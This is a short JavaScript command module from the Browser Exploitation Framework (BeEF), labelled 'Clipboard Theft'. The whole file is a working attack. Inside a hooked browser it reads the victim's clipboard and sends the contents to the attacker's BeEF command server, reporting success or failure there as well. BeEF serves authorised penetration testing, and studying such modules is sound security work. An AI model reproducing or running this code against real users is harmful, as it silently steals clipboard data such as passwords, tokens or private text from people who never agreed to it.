//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
  try {
    var clipboard = clipboardData.getData("Text");
    beef.debug("[Clipboard Theft] Success: Retrieved clipboard contents (" + clipboard.length + ' bytes)');
    beef.net.send("<%= @command_url %>", <%= @command_id %>, "clipboard="+clipboard, beef.are.status_success());
  } catch (e) {
    beef.debug("[Clipboard Theft] Error: Could not retrieve clipboard contents");
    beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=clipboardData.getData is not supported.", beef.are.status_error());
  }
});
